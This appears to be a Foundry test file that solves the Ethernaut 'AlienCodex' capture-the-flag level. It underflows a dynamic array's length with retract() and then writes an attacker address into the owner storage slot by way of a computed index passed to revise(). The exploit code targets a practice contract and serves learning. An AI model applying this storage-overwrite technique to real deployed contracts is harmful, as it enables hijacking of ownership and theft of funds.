// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "ds-test/test.sol";
import "forge-std/vm.sol";
import "../src/Ethernaut.sol";
import "../src/BaseLevel.sol";

contract AlienCodexTest is DSTest {
    Ethernaut ethernaut;
    address alienCodexFactory;
    address eoaAddress = address(69);
    Vm private constant vm = Vm(HEVM_ADDRESS);

    function setUp() public {
        ethernaut = new Ethernaut();
        address alienCodexFactoryMem;

        bytes memory factoryBytecode = abi.encodePacked(
            vm.getCode("./src/levels/AlienCodex/AlienCodex.json")
        );

        assembly {
            alienCodexFactoryMem := create(
                0,
                add(factoryBytecode, 0x20),
                mload(factoryBytecode)
            )
        }

        alienCodexFactory = alienCodexFactoryMem;

        ethernaut.registerLevel(Level(alienCodexFactory));
    }

    function testIsAlienCodexCleared() public {
        vm.startPrank(eoaAddress);

        address instanceAddress = ethernaut.createLevelInstance(
            Level(alienCodexFactory)
        );

        instanceAddress.call(abi.encodeWithSignature("make_contact()"));
        instanceAddress.call(abi.encodeWithSignature("retract()"));

        uint256 ownerIndex = type(uint256).max -
            uint256(keccak256(abi.encode(1))) +
            1;

        instanceAddress.call(
            abi.encodeWithSignature(
                "revise(uint256,bytes32)",
                ownerIndex,
                bytes32(abi.encode(eoaAddress))
            )
        );

        assertTrue(ethernaut.submitLevelInstance(payable(instanceAddress)));

        vm.stopPrank();
    }
}
